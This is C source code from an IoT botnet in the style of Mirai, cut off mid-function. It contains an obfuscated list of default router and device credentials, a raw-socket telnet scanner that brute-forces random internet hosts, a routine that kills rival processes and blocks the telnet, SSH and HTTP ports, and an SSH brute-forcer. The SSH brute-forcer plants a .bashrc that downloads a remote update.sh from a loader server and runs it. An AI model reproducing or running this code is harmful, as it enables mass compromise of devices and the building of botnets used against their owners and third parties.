	add_auth_entry("\x50\x4D\x4D\x56", "\x14\x1B\x14\x1B\x14\x1B", 6);					   //root:696969
	add_auth_entry("\x50\x4D\x4D\x56", "\x52\x43\x17\x17\x55\x12\x50\x46", 8);			   //root:pa55w0rd
	add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x13\x10\x11", 6);					   //root:123123
	add_auth_entry("\x50\x4D\x4D\x56", "\x70\x6D\x6D\x76\x17\x12\x12", 7);				   //root:root500
	add_auth_entry("\x50\x4D\x4D\x56", "\x43\x4E\x52\x4B\x4C\x47", 6);					   //root:alpine
	add_auth_entry("\x50\x4D\x4D\x56", "\x58\x56\x47\x1B\x5A\x13\x17", 7);				   //root:zte9x15
	add_auth_entry("\x50\x4D\x4D\x56", "\x40\x13\x10\x12\x50\x4D\x4D\x56", 8);			   //root:b120root
	add_auth_entry("\x50\x4D\x4D\x56", "\x72\x63\x71\x71\x75\x6D\x70\x66", 8);			   //root:PASSWORD
	add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x63\x66\x6F\x6B\x6C", 5);					   //admin:admin
	add_auth_entry("\x63\x66\x6F\x6B\x6C", "\x63\x66\x6F\x6B\x6C", 5);					   //admin:admin
	add_auth_entry("\x4C\x47\x56\x45\x47\x43\x50", "\x4C\x47\x56\x45\x47\x43\x50", 7);	   //netgear:netgear
	add_auth_entry("\x54\x56\x13\x12\x12", "\x52\x57\x40\x4E\x4B\x41", 6);				   //vt100:public
	add_auth_entry("\x4B\x40\x4F", "\x52\x43\x51\x51\x55\x4D\x50\x46", 8);				   //ibm:password
	add_auth_entry("\x54\x5B\x43\x56\x56\x43", "\x54\x5B\x43\x56\x56\x43", 6);			   //vyatta:vyatta
	add_auth_entry("\x63\x46\x4F\x4B\x4C", "\x43\x56\x41\x16\x17\x14", 6);				   //admin:atc456
	add_auth_entry("\x4F\x4B\x41\x50\x4D\x51", "\x4F\x4B\x41\x50\x4D\x51", 6);			   //micros:micros
	add_auth_entry("\x51\x47\x56\x57\x52", "\x51\x47\x56\x57\x52", 5);					   //setup:setup
	add_auth_entry("\x41\x4D\x4F\x41\x43\x51\x56", "\x41\x4D\x4F\x41\x43\x51\x56", 7);	   //comcast:comcast
	add_auth_entry("\x52\x4D\x51", "\x52\x4D\x51", 3);									   //pos:pos
	add_auth_entry("\x55\x55\x55", "\x55\x55\x55", 3);									   //www:www
	add_auth_entry("\x10\x1A\x12\x12", "\x10\x1A\x12\x12", 4);							   //2800:2800
	add_auth_entry("\x77\x60\x6C\x76", "\x77\x60\x6C\x76", 4);							   //UBNT:UBNT
	add_auth_entry("\x4C\x47\x56\x4F\x43\x4C", "", 6);									   //netman:
	add_auth_entry("\x43\x66\x6F\x6B\x6C", "\x13\x13\x13\x13", 5);						   //admin:1111
	add_auth_entry("\x43\x66\x6F\x6B\x6C", "\x13\x10\x11\x16\x17\x14", 6);				   //admin:123456
	add_auth_entry("\x46\x43\x47\x4F\x4D\x4C", "", 6);			                           //daemon:
	add_auth_entry("\x46\x43\x47\x4F\x4D\x4C", "\x46\x43\x47\x4F\x4D\x4C", 6);			   //daemon:daemon
	add_auth_entry("\x46\x47\x4F\x4D", "\x46\x47\x4F\x4D", 4);							   //demo:demo
	add_auth_entry("\x43\x50\x50\x4B\x51", "\x43\x46\x4F\x4B\x4C", 5);					   //arris:admin
	add_auth_entry("\x6E\x4B\x4C\x49\x51\x5B\x51", "\x43\x46\x4F\x4B\x4C", 7);			   //Linksys:admin
	add_auth_entry("\x41\x4E\x4B\x47\x4C\x56", "\x41\x4E\x4B\x47\x4C\x56", 6);			   //client:client
	add_auth_entry("\x41\x4B\x51\x41\x4D", "\x61\x6B\x71\x61\x6D", 5);					   //cisco:CISCO
	add_auth_entry("\x51\x57\x52\x47\x50", "\x51\x57\x50\x56", 5);						   //super:surt
	add_auth_entry("\x15\x14\x17\x16\x11\x10\x13", "\x15\x14\x17\x16\x11\x10\x13", 7);	   //7654321:7654321
	add_auth_entry("\x43\x46\x51\x4E", "\x43\x46\x51\x4E\x13\x10\x11\x16", 8);			   //adsl:adsl1234
	add_auth_entry("\x52\x43\x56\x50\x4D\x4E", "\x52\x43\x56\x50\x4D\x4E", 6);			   //patrol:patrol
	add_auth_entry("\x4F\x45\x11\x17\x12\x12", "\x4F\x47\x50\x4E\x4B\x4C", 6);			   //mg3500:merlin
	add_auth_entry("", "\x4C\x47\x56\x43\x46\x4F\x4B\x4C", 8);							   //(none):netadmin
	add_auth_entry("", "\x4A\x47\x55\x4E\x52\x43\x41\x49", 8);							   //(none):hewlpack
	add_auth_entry("", "\x6C\x47\x56\x6B\x61\x51", 6);									   //(none):NetICs
	add_auth_entry("\x40\x40\x51\x46\x0F\x41\x4E\x4B\x47\x4C\x56", "\x6C\x77\x6E\x6E", 11);  //bbsd-client:NULL
	add_auth_entry("\x43\x46\x4F\x4B\x4C\x56\x56\x46", "\x43\x46\x4F\x4B\x4C\x56\x56\x46", 8);  //adminttd:adminttd
	add_auth_entry("\x4D\x52\x47\x50\x43\x56\x4D\x50", "\x4D\x52\x47\x50\x43\x56\x4D\x50", 8);  //operator:operator
	add_auth_entry("\x72\x4E\x41\x4F\x71\x52\x6B\x52", "\x72\x4E\x41\x4F\x71\x52\x6B\x52", 8);  //PlcmSpIp:PlcmSpIp
	add_auth_entry("\x13\x13\x13\x13\x13\x13\x13\x13", "\x13\x13\x13\x13\x13\x13\x13\x13", 8);  //11111111:11111111
	add_auth_entry("\x10\x10\x10\x10\x10\x10\x10\x10", "\x10\x10\x10\x10\x10\x10\x10\x10", 8);  //22222222:22222222
	add_auth_entry("\x51\x47\x41\x57\x50\x4B\x56\x5B", "\x51\x47\x41\x57\x50\x4B\x56\x5B", 8);  //security:security
	add_auth_entry("\x4F\x4D\x57\x4C\x56\x51\x5B\x51", "\x4F\x4D\x57\x4C\x56\x51\x5B\x51", 8);  //mountsys:mountsys
	add_auth_entry("\x4F\x47\x4F\x4D\x56\x47\x41", "\x51\x57\x52\x47\x50\x54\x4B\x51\x4D\x50", 10);  //memotec:supervisor
	add_auth_entry("\x50\x4D\x4D\x56", "\x6E\x71\x4B\x57\x7B\x15\x52\x6D\x4F\x78\x65\x10\x51", 13);  //root:LSiuY7pOmZG2s
	add_auth_entry("\x63\x46\x4F\x4B\x4C", "\x11\x77\x68\x77\x4A\x10\x74\x47\x4F\x67\x44\x77\x56\x47", 14);  //admin:3UJUh2VemEfUte
	add_auth_entry("\x4F\x57\x51\x47\x43\x46\x4F\x4B\x4C", "\x6F\x57\x51\x47\x03\x63\x46\x4F\x4B\x4C", 10);  //museadmin:Muse!admin
	add_auth_entry("\x51\x56\x4D\x50\x55\x43\x56\x41\x4A", "\x51\x52\x47\x41\x4B\x43\x4E\x4B\x51\x56", 10);  //storwatch:specialist
	add_auth_entry("\x43\x46\x4F\x4B\x4C\x52\x4E\x46\x56", "\x13\x10\x11\x16\x17\x14\x15\x1A\x1B\x12", 10);  //adminpldt:1234567890
	add_auth_entry("\x52\x4E\x46\x56\x43\x46\x4F\x4B\x4C", "\x13\x10\x11\x16\x17\x14\x15\x1A\x1B\x12", 10);  //pldtadmin:1234567890
	add_auth_entry("\x40\x40\x51\x46\x0F\x41\x4E\x4B\x47\x4C\x56", "\x41\x4A\x43\x4C\x45\x47\x4F\x47\x10", 11);  //bbsd-client:changeme2
	add_auth_entry("\x56\x47\x4E\x47\x41\x4D\x4F\x43\x46\x4F\x4B\x4C", "\x43\x46\x4F\x4B\x4C\x56\x47\x4E\x47\x41\x4D\x4F", 12);  //telecomadmin:admintelecom
	add_auth_entry("\x45\x57\x47\x51\x56\x22", "\x5A\x41\x11\x14\x13\x13\x22", 13); //guest:xc3611
	add_auth_entry("\x46\x47\x44\x43\x57\x4E\x56\x22", "\x43\x4C\x56\x51\x4E\x53\x22", 15);//default:antslq
	add_auth_entry("\x51\x57\x52\x47\x50\x54\x4B\x51\x4D\x50\x22", "\x58\x5B\x43\x46\x13\x10\x11\x16\x22", 20); //supervisor:zyad1234
	add_auth_entry("\x50\x4D\x4D\x56\x22", "\x58\x5B\x43\x46\x13\x10\x11\x16\x22", 14); //root:zyad1234
 
 
#ifdef DEBUG
    printf("[scanner] Scanner process initialized. Scanning started.\n");
#endif
    int port_ = 23;
    // Main logic loop
    while (1)
    {
        fd_set fdset_rd, fdset_wr;
        struct scanner_connection *conn;
        struct timeval tim;
        int last_avail_conn, last_spew, mfd_rd = 0, mfd_wr = 0, nfds;
 
        // Spew out SYN to try and get a response
        if (fake_time != last_spew)
        {
            last_spew = fake_time;
 
            for (i = 0; i < SCANNER_RAW_PPS; i++)
            {
                struct sockaddr_in paddr = {0};
                struct iphdr *iph = (struct iphdr *)scanner_rawpkt;
                struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
 
                iph->id = rand_next();
                iph->saddr = LOCAL_ADDR;
                iph->daddr = get_random_ip();
                iph->check = 0;
                iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
 
                if (i % 10 == 0)
                {
                    port_ = 2323;
                    tcph->dest = HTONS(2323);
                }
                else
                {
                    port_ = 23;
                    tcph->dest = HTONS(23);
                }
                tcph->seq = iph->daddr;
                tcph->check = 0;
                tcph->check = checksum_tcpudp(iph, tcph, HTONS(sizeof (struct tcphdr)), sizeof (struct tcphdr));
 
                paddr.sin_family = AF_INET;
                paddr.sin_addr.s_addr = iph->daddr;
                paddr.sin_port = tcph->dest;
 
                sendto(rsck, scanner_rawpkt, sizeof (scanner_rawpkt), MSG_NOSIGNAL, (struct sockaddr *)&paddr, sizeof (paddr));
            }
        }
 
        // Read packets from raw socket to get SYN+ACKs
        last_avail_conn = 0;
        while (1)
        {
            int n;
            char dgram[1514];
            struct iphdr *iph = (struct iphdr *)dgram;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            struct scanner_connection *conn;
 
            errno = 0;
            n = recvfrom(rsck, dgram, sizeof (dgram), MSG_NOSIGNAL, NULL, NULL);
            if (n <= 0 || errno == EAGAIN || errno == EWOULDBLOCK)
                break;
 
            if (n < sizeof(struct iphdr) + sizeof(struct tcphdr))
                continue;
            if (iph->daddr != LOCAL_ADDR)
                continue;
            if (iph->protocol != IPPROTO_TCP)
                continue;
            if (tcph->source != HTONS(23) && tcph->source != HTONS(2323))
                continue;
            if (tcph->dest != source_port)
                continue;
            if (!tcph->syn)
                continue;
            if (!tcph->ack)
                continue;
            if (tcph->rst)
                continue;
            if (tcph->fin)
                continue;
            if (HTONL(ntohl(tcph->ack_seq) - 1) != iph->saddr)
                continue;
 
            conn = NULL;
            for (n = last_avail_conn; n < SCANNER_MAX_CONNS; n++)
            {
                if (conn_table[n].state == SC_CLOSED)
                {
                    conn = &conn_table[n];
                    last_avail_conn = n;
                    break;
                }
            }
 
            // If there were no slots, then no point reading any more
            if (conn == NULL)
                break;
 
            conn->dst_addr = iph->saddr;
            conn->dst_port = tcph->source;
            setup_connection(conn);
#ifdef DEBUG
            printf("[scanner] FD%d Attempting to brute found IP %d.%d.%d.%d\n", conn->fd, iph->saddr & 0xff, (iph->saddr >> 8) & 0xff, (iph->saddr >> 16) & 0xff, (iph->saddr >> 24) & 0xff);
#endif
        }
 
        // Load file descriptors into fdsets
        FD_ZERO(&fdset_rd);
        FD_ZERO(&fdset_wr);
        for (i = 0; i < SCANNER_MAX_CONNS; i++)
        {
            int timeout;
 
            conn = &conn_table[i];
            timeout = (conn->state > SC_CONNECTING ? 30 : 5);
 
            if (conn->state != SC_CLOSED && (fake_time - conn->last_recv) > timeout)
            {
#ifdef DEBUG
                printf("[scanner] FD%d timed out (state = %d)\n", conn->fd, conn->state);
#endif
                close(conn->fd);
                conn->fd = -1;
 
                // Retry
                if (conn->state > SC_HANDLE_IACS) // If we were at least able to connect, try again
                {
                    if (++(conn->tries) == 10)
                    {
                        conn->tries = 0;
                        conn->state = SC_CLOSED;
                    }
                    else
                    {
                        setup_connection(conn);
#ifdef DEBUG
                        printf("[scanner] FD%d retrying with different auth combo!\n", conn->fd);
#endif
                    }
                }
                else
                {
                    conn->tries = 0;
                    conn->state = SC_CLOSED;
                }
                continue;
            }
 
            if (conn->state == SC_CONNECTING)
            {
                FD_SET(conn->fd, &fdset_wr);
                if (conn->fd > mfd_wr)
                    mfd_wr = conn->fd;
            }
            else if (conn->state != SC_CLOSED)
            {
                FD_SET(conn->fd, &fdset_rd);
                if (conn->fd > mfd_rd)
                    mfd_rd = conn->fd;
            }
        }
 
        tim.tv_usec = 0;
        tim.tv_sec = 1;
        nfds = select(1 + (mfd_wr > mfd_rd ? mfd_wr : mfd_rd), &fdset_rd, &fdset_wr, NULL, &tim);
        fake_time = time(NULL);
 
        for (i = 0; i < SCANNER_MAX_CONNS; i++)
        {
            conn = &conn_table[i];
 
            if (conn->fd == -1)
                continue;
 
            if (FD_ISSET(conn->fd, &fdset_wr))
            {
                int err = 0, ret = 0;
                socklen_t err_len = sizeof (err);
 
                ret = getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, (void * )(&err), &err_len);
                if (err == 0 && ret == 0)
                {
                    conn->state = SC_HANDLE_IACS;
                    conn->auth = random_auth_entry();
                    conn->rdbuf_pos = 0;
#ifdef DEBUG
                    printf("[scanner] FD%d connected. Trying %s:%s\n", conn->fd, conn->auth->username, conn->auth->password);
#endif
                }
                else
                {
#ifdef DEBUG
                    printf("[scanner] FD%d error while connecting = %d\n", conn->fd, err);
#endif
                    close(conn->fd);
                    conn->fd = -1;
                    conn->tries = 0;
                    conn->state = SC_CLOSED;
                    continue;
                }
            }
 
            if (FD_ISSET(conn->fd, &fdset_rd))
            {
                while (1)
                {
                    int ret;
 
                    if (conn->state == SC_CLOSED)
                        break;
 
                    if (conn->rdbuf_pos == SCANNER_RDBUF_SIZE)
                    {
                        memmove(conn->rdbuf, conn->rdbuf + SCANNER_HACK_DRAIN, SCANNER_RDBUF_SIZE - SCANNER_HACK_DRAIN);
                        conn->rdbuf_pos -= SCANNER_HACK_DRAIN;
                    }
                    errno = 0;
                    ret = recv_strip_null(conn->fd, conn->rdbuf + conn->rdbuf_pos, SCANNER_RDBUF_SIZE - conn->rdbuf_pos, MSG_NOSIGNAL);
                    if (ret == 0)
                    {
#ifdef DEBUG
                        printf("[scanner] FD%d connection gracefully closed\n", conn->fd);
#endif
                        errno = ECONNRESET;
                        ret = -1; // Fall through to closing connection below
                    }
                    if (ret == -1)
                    {
                        if (errno != EAGAIN && errno != EWOULDBLOCK)
                        {
#ifdef DEBUG
                            printf("[scanner] FD%d lost connection\n", conn->fd);
#endif
                            close(conn->fd);
                            conn->fd = -1;
 
                            // Retry
                            if (++(conn->tries) >= 10)
                            {
                                conn->tries = 0;
                                conn->state = SC_CLOSED;
                            }
                            else
                            {
                                setup_connection(conn);
#ifdef DEBUG
                                printf("[scanner] FD%d retrying with different auth combo!\n", conn->fd);
#endif
                            }
                        }
                        break;
                    }
                    conn->rdbuf_pos += ret;
                    conn->last_recv = fake_time;
 
                    while (1)
                    {
                        int consumed = 0;
 
                        switch (conn->state)
                        {
                        case SC_HANDLE_IACS:
                            if ((consumed = consume_iacs(conn)) > 0)
                            {
                                conn->state = SC_WAITING_USERNAME;
#ifdef DEBUG
                                printf("[scanner] FD%d finished telnet negotiation\n", conn->fd);
#endif
                            }
                            break;
                        case SC_WAITING_USERNAME:
                            if ((consumed = consume_user_prompt(conn)) > 0)
                            {
                                send(conn->fd, conn->auth->username, conn->auth->username_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                conn->state = SC_WAITING_PASSWORD;
#ifdef DEBUG
                                printf("[scanner] FD%d received username prompt\n", conn->fd);
#endif
                            }
                            break;
                        case SC_WAITING_PASSWORD:
                            if ((consumed = consume_pass_prompt(conn)) > 0)
                            {
#ifdef DEBUG
                                printf("[scanner] FD%d received password prompt\n", conn->fd);
#endif
 
                                // Send password
                                send(conn->fd, conn->auth->password, conn->auth->password_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
 
                                conn->state = SC_WAITING_PASSWD_RESP;
                            }
                            break;
                        case SC_WAITING_PASSWD_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
#ifdef DEBUG
                                printf("[scanner] FD%d received shell prompt\n", conn->fd);
#endif
 
                                // Send enable / system / shell / sh to session to drop into shell if needed
                                send(conn->fd, "enable", 6, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                conn->state = SC_WAITING_ENABLE_RESP;
                            }
                            break;
                        case SC_WAITING_ENABLE_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
 
#ifdef DEBUG
                                printf("[scanner] FD%d received sh prompt\n", conn->fd);
#endif
 
                                send(conn->fd, "system", 6, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
 
                                conn->state = SC_WAITING_SYSTEM_RESP;
                            }
                            break;
            case SC_WAITING_SYSTEM_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str;
 
#ifdef DEBUG
                                printf("[scanner] FD%d received sh prompt\n", conn->fd);
#endif
 
                                send(conn->fd, "shell", 5, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
 
                                conn->state = SC_WAITING_SHELL_RESP;
                            }
                            break;
                        case SC_WAITING_SHELL_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
#ifdef DEBUG
                                printf("[scanner] FD%d received enable prompt\n", conn->fd);
#endif
 
                                send(conn->fd, "sh", 2, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                conn->state = SC_WAITING_SH_RESP;
                            }
                            break;
                        case SC_WAITING_SH_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
#ifdef DEBUG
                                printf("[scanner] FD%d received shELL prompt\n", conn->fd);
#endif
 
                                // Send query string
                                send(conn->fd, "echo -e \"\\x65\\x6e\\x65\\x6d\\x79\"", 30, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                conn->state = SC_WAITING_TOKEN_RESP;
                            }
                            break;
                        case SC_WAITING_TOKEN_RESP:
							if(util_memsearch(conn->rdbuf, conn->rdbuf_pos, "enemy", 5) != -1) {
								report_working(conn->dst_addr, port_, conn->auth, sock);
							}
                            break;
                        default:
                            consumed = 0;
                            break;
                        }
 
                        // If no data was consumed, move on
                        if (consumed == 0)
                            break;
                        else
                        {
                            if (consumed > conn->rdbuf_pos)
                                consumed = conn->rdbuf_pos;
 
                            conn->rdbuf_pos -= consumed;
                            memmove(conn->rdbuf, conn->rdbuf + consumed, conn->rdbuf_pos);
                        }
                    }
                }
            }
        }
    }
}
 


void coil_xywz(int parentpid)
{
    int coil_highest_pid = coil_MIN_PID, last_pid_j83j = time(NULL), tmp_bind_fd;
    uint32_t j83j_counter = 0;
    struct sockaddr_in tmp_bind_addr;

    // Let parent continue on main thread
    coil_pid = fork();
    if (coil_pid > 0 || coil_pid == -1)
        return;

    tmp_bind_addr.sin_family = AF_INET;
    tmp_bind_addr.sin_addr.s_addr = INADDR_ANY;

    // Kill telnet service and prevent it from restarting
#ifdef REBIND_TELNET
    coil_start(HTONS(23));
    
    tmp_bind_addr.sin_port = HTONS(23);

    if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
        listen(tmp_bind_fd, 1);
    }
#endif

    // Kill SSH service and prevent it from restarting
#ifdef REBIND_SSH
    coil_start(HTONS(22));
    
    tmp_bind_addr.sin_port = HTONS(22);

    if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
        listen(tmp_bind_fd, 1);
    }
#endif

    // Kill HTTP service and prevent it from restarting
#ifdef REBIND_HTTP
    coil_start(HTONS(80));
    tmp_bind_addr.sin_port = HTONS(80);

    if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
        listen(tmp_bind_fd, 1);
    }
#endif

    // Kill EVERY service and prevent it from restarting
#ifdef REBIND_EVERYTHINGLOL
    int rebind;
	for(rebind = 1; rebind < 65535; rebind++) {
		if(coil_start(HTONS(rebind))) {
			tmp_bind_addr.sin_port = HTONS(rebind);

			if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
			{
				bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
				listen(tmp_bind_fd, 1);
			}
		}
	}
#endif

    // In case the binary is getting deleted, we want to get the REAL exe
  //  sleep(5);

    coil_exe = malloc(PATH_MAX);
    coil_exe[0] = 0;
    coil_exe_len = 0;

    if (!aiuf())
    {
        return;
    }

    while (1)
    {
        DIR *dir;
        struct dirent *file;
        if ((dir = opendir(eika("\x27\xa0\xe7\xb9\xce\x27"))) == NULL)
        {
            break;
        }
        while ((file = readdir(dir)) != NULL)
        {
            // skip all folders that are not PIDs
            if (*(file->d_name) < '0' || *(file->d_name) > '9')
                continue;

            char exe_path[64], *ptr_exe_path = exe_path, exe[PATH_MAX];
            char status_path[64], *ptr_status_path = status_path;
            int rp_len, fd, pid = atoi(file->d_name);
            j83j_counter++;
            if (pid <= coil_highest_pid && pid != parentpid || pid != getpid()) //skip our parent and our own pid
            {
                if (time(NULL) - last_pid_j83j > coil_RESTART_SCAN_TIME) // If more than coil_RESTART_SCAN_TIME has passed, restart j83js from lowest PID for process wrap
                {
                    coil_highest_pid = coil_MIN_PID;
                }
                else
                {
                    if (pid > coil_MIN_PID && j83j_counter % 10 == 0)
                        sleep(1); // Sleep so we can wait for another process to spawn
                }

                continue;
            }
            if (pid > coil_highest_pid)
                coil_highest_pid = pid;
            last_pid_j83j = time(NULL);

            // Store /proc/$pid/exe into exe_path
            ptr_exe_path += util_strcpy(ptr_exe_path, eika("\x27\xa0\xe7\xb9\xce\x27"));
            ptr_exe_path += util_strcpy(ptr_exe_path, file->d_name);
            ptr_exe_path += util_strcpy(ptr_exe_path, eika("\x27\x51\xc1\x51"));

            // Store /proc/$pid/status into status_path
            ptr_status_path += util_strcpy(ptr_status_path, eika("\x27\xa0\xe7\xb9\xce\x27"));
            ptr_status_path += util_strcpy(ptr_status_path, file->d_name);
            ptr_status_path += util_strcpy(ptr_status_path, "/status");

            // Resolve exe_path (/proc/$pid/exe) -> exe
            if ((rp_len = readlink(exe_path, exe, sizeof (exe) - 1)) != -1)
            {
                exe[rp_len] = 0; // Nullterminate exe, since readlink doesn't guarantee a null terminated string

                // Skip this file if its exe == coil_exe
                if (pid == getpid() || pid == getppid() || util_strcmp(exe, coil_exe))
                    continue;

                if ((fd = open(exe, O_RDONLY)) == -1)
                {
                    kill(pid, 9);
                }
                close(fd);
            }

            if (d8ds(exe_path))
            {
                kill(pid, 9);
            } 

            

            // Don't let others memory j83j!!!
            util_zero(exe_path, sizeof (exe_path));
            util_zero(status_path, sizeof (status_path));

            sleep(1);
        }

        closedir(dir);
    }
}

#ifdef ENEMY
struct ssh_fds {
    uint16_t port;
    int sock;
    char ip[16];
};
 int waitsocket(int socket_fd, LIBSSH2_SESSION *session)
{

    struct timeval timeout;
    int rc;
    fd_set fd;
    fd_set *writefd = NULL;
    fd_set *readfd = NULL;
    int dir;
 
    timeout.tv_sec = 10;
    timeout.tv_usec = 0;
 
    FD_ZERO(&fd);
 
    FD_SET(socket_fd, &fd);
 
    dir = libssh2_session_block_directions(session);

 
    if(dir & LIBSSH2_SESSION_BLOCK_INBOUND)
        readfd = &fd;
 
    if(dir & LIBSSH2_SESSION_BLOCK_OUTBOUND)
        writefd = &fd;
 
    rc = select(socket_fd + 1, readfd, writefd, NULL, &timeout);
 
    return rc;
}

int pam_auth(char *username, char *password, char *host)
{
  LIBSSH2_CHANNEL *channel;
  int rc;
 
 
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = HTONS(22);
    sin.sin_addr.s_addr = inet_addr(host);
    if(connect(sock, (struct sockaddr*)(&sin),
                sizeof(struct sockaddr_in)) != 0) {
 //       // fprintf(stdout, "failed to connect!\n");
        return 1; //break out of brute loop and save time
    }
 
    LIBSSH2_SESSION *session = libssh2_session_init();

    libssh2_session_set_blocking(session, 0);

    while((rc = libssh2_session_handshake(session, sock)) ==
           LIBSSH2_ERROR_EAGAIN);
    if(rc) {
#ifdef SSHDEBUG
        fprintf(stderr, "Failure establishing SSH session: %d\n", rc);
#endif
        return 1;
    }


 
    while((rc = libssh2_userauth_password(session, username, password)) ==
          LIBSSH2_ERROR_EAGAIN);
    if(rc) {
#ifdef SSHDEBUG
    fprintf(stdout, "FAILED LOGIN! -> %s:22 %s:%s\n", host, username, password);
#endif
        return -1;
    }

#ifdef SSHDEBUG
    fprintf(stdout, "SUCCESSFUL SSH LOGIN! -> %s:22 %s:%s\n", host, username, password);
#endif

    while((channel = libssh2_channel_open_session(session)) == NULL &&
          libssh2_session_last_error(session, NULL, NULL, 0) ==
          LIBSSH2_ERROR_EAGAIN) {
        waitsocket(sock, session);
    }
	
 
    libssh2_session_set_blocking(session, 1);
    FILE *local;
    char mem[1024*100];
    size_t nread;
    char *ptr;

	char *bashrc = "..bashrc";

	FILE *fptr = fopen(bashrc,"w");

   if(fptr == NULL)
   {
	   
	#ifdef SSHDEBUG
      printf("Error! writing to file"); 
	  #endif
   }
	char rekdevice[512];
    memset(rekdevice, 0, sizeof(rekdevice));
    sprintf(rekdevice, "cd /tmp || cd /home/$USER || cd /var/run || cd /mnt || cd /data || cd /root || cd /; wget http://%s/update.sh -O update.sh; busybox wget http://%s/update.sh -O update.sh; curl http://%s/update.sh -O update.sh; chmod 777 update.sh; ./update.sh; rm -rf update.sh", ldserver, ldserver, ldserver);
    int bufsize = strlen(rekdevice);
   fprintf(fptr,"%s\n",rekdevice);
   fclose(fptr);
   struct stat fileinfo;
   stat("..bashrc", &fileinfo);
    local = fopen(bashrc, "rb");

    if(!local) {
		return -1;
    }
 
 
    /* Send a file via scp. The mode parameter must only have permissions! */ 
    channel = libssh2_scp_send(session, ".bashrc", fileinfo.st_mode & 0777,

                               (unsigned long)fileinfo.st_size);
 
    if(!channel) {
        char *errmsg;
        int errlen;
        int err = libssh2_session_last_error(session, &errmsg, &errlen, 0);

        goto shutdown;
    }
 
    do {
        nread = fread(mem, 1, sizeof(mem), local);
        if(nread <= 0) {
            /* end of file */ 
            break;
        }
        ptr = mem;
 
        do {
            /* write the same data over and over, until error or completion */ 
            rc = libssh2_channel_write(channel, ptr, nread);

            if(rc < 0) {
	#ifdef SSHDEBUG
                fprintf(stderr, "ERROR %d\n", rc);
				#endif
                break;
            }
            else {
                /* rc indicates how many bytes were written this time */ 
                ptr += rc;
                nread -= rc;
            }
        } while(nread);
 
    } while(1);
 
	#ifdef SSHDEBUG
    fprintf(stderr, "Sending EOF\n");
	#endif

    libssh2_channel_send_eof(channel);

 
	#ifdef SSHDEBUG
    fprintf(stderr, "Waiting for EOF\n");
		#endif

    libssh2_channel_wait_eof(channel);

 
	#ifdef SSHDEBUG
    fprintf(stderr, "Waiting for channel to close\n");
		#endif

    libssh2_channel_wait_closed(channel);

 	
#ifdef SSHDEBUG
	        fprintf(stderr, "SUCCESSFULLY WROTE TO BASHRC... OPENING PTY\n");
#endif

	#ifdef SSHDEBUG
	    fprintf(stderr, "reconnecting to trigger .bashrc\n");
	#endif


    while((channel = libssh2_channel_open_session(session)) == NULL &&
          libssh2_session_last_error(session, NULL, NULL, 0) ==
          LIBSSH2_ERROR_EAGAIN) {
        waitsocket(sock, session);
    }
	
 
    libssh2_session_set_blocking(session, 1); 
	
    if(libssh2_channel_request_pty(channel, "vt100")) {
#ifdef SSHDEBUG
        fprintf(stderr, "Failed requesting pty\n");
#endif
        goto skip_shell;
    }

    if(libssh2_channel_shell(channel)) {        
#ifdef SSHDEBUG
        fprintf(stderr, "Unable to request shell on allocated pty\n");
#endif
        goto shutdown;
    }
    libssh2_session_set_blocking(session, 0);

    int totwritten = 0;
    if(totwritten < bufsize) {
        int left = bufsize - totwritten;
        int size = (left < bufsize) ? left : bufsize;
        int n = libssh2_channel_write_ex(channel, 0, rekdevice, bufsize);
        if(n < 0) {
            return 1; //fail
        }
        else {
            totwritten += n;
        }
    }
    libssh2_channel_flush(channel);
    libssh2_channel_send_eof(channel);
    sleep(1);
#ifdef SSHDEBUG
    fprintf(stdout, "SUCCESSFUL SSH HACK! -> %s:22 %s:%s\n", host, username, password);
#endif
 
  skip_shell:
    if(channel) {
        libssh2_channel_free(channel);

        channel = NULL;
    }
 
  shutdown:
 
    if(session) {
        libssh2_session_disconnect(session, "");
        libssh2_session_free(session);

    }
    return 2;
}
#define __MAX_SSH_FORKS 4 //DONT CHANGE THIS LOL
#define __MAX_SSH_FDS 12 //DONT CHANGE THIS LOL
void sshj83j(void) {
    int f;
    for(f = 0; f < __MAX_SSH_FORKS; f++) {
        pid_t pid;
        pid = fork();
        if (pid < 0) {
            return;
        }
        if(pid == 0) {
            struct rlimit old;
            if (getrlimit(RLIMIT_NOFILE, &old) != -1) { old.rlim_cur = old.rlim_max; setrlimit(RLIMIT_NOFILE, &old); } //SET MAX FILE DESCRIPTORS CROSS PLATFORM
            int v, k, mode;
